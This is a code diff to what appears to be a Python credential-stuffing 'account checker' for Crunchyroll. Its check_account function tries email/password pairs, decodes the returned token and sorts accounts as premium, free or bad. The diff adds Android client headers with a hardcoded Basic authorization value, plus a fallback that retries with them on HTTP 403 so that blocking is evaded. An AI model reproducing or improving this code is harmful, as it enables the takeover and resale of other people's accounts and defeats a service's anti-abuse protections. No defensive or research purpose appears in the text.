@@ -57,6 +57,16 @@ LOGIN_HEADERS = {
     "Connection": "keep-alive",
 }
 
+ANDROID_LOGIN_HEADERS = {
+    "Host": "www.crunchyroll.com",
+    "User-Agent": "Crunchyroll/3.67.0 Android/14",
+    "Accept": "*/*",
+    "Accept-Encoding": "deflate, gzip",
+    "Authorization": "Basic bm9haWhkZXZtZ2puMmpleFg3ZGlfZTpsTjFRQXp4WV9kZzVPelZ5U3ZzYkJlUjhkX2t3cFljbg==",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Connection": "keep-alive",
+}
+
 # ============================================
 #  MAPEAMENTO DE PLANOS
 # ============================================
@@ -305,18 +315,46 @@ def check_account(session: requests.Session, email: str, password: str) -> dict:
             time.sleep(wait)
             continue
 
+        elif resp.status_code == 403:
+            # Tenta fallback imediato com headers do cliente Android
+            try:
+                resp_android = session.post(AUTH_URL, headers=ANDROID_LOGIN_HEADERS, data=data, timeout=TIMEOUT)
+                if resp_android.status_code == 200:
+                    try:
+                        jd = resp_android.json()
+                        access_token = jd.get("access_token", "")
+                        if access_token:
+                            payload = decode_jwt(access_token)
+                            country = payload.get("country", "BR") or "BR"
+                            token_exp = payload.get("exp", int(time.time() + 3600))
+                            jwt_bens = normalize_benefits(payload.get("benefits"))
+                            plan = get_plan_name(jwt_bens)
+                            has_premium = is_premium(jwt_bens) or (plan not in ["FREE", ""])
+                            return {
+                                "status": "premium" if has_premium else "free",
+                                "access_token": access_token,
+                                "country": country.upper(),
+                                "plan": f"Crunchyroll {plan}" if not plan.startswith("Crunchyroll") else plan,
+                                "benefits": jwt_bens,
+                                "exp": token_exp
+                            }
+                    except Exception:
+                        pass
+                elif resp_android.status_code == 401:
+                    return {"status": "bad", "reason": "WRONG_CREDS"}
+            except Exception:
+                pass
+            return {"status": "error", "reason": "HTTP_403"}
+
         elif resp.status_code == 401:
             return {"status": "bad", "reason": "WRONG_CREDS"}
-
-        elif resp.status_code == 403:
-            return {"status": "bad", "reason": "HTTP_403"}
 
         else:
             try:
                 err = resp.json().get("error", f"HTTP_{resp.status_code}")
             except Exception:
                 err = f"HTTP_{resp.status_code}"
-            return {"status": "bad", "reason": err}
+            return {"status": "error", "reason": err}
 
     return {"status": "error", "reason": "MAX_RETRY"}
 
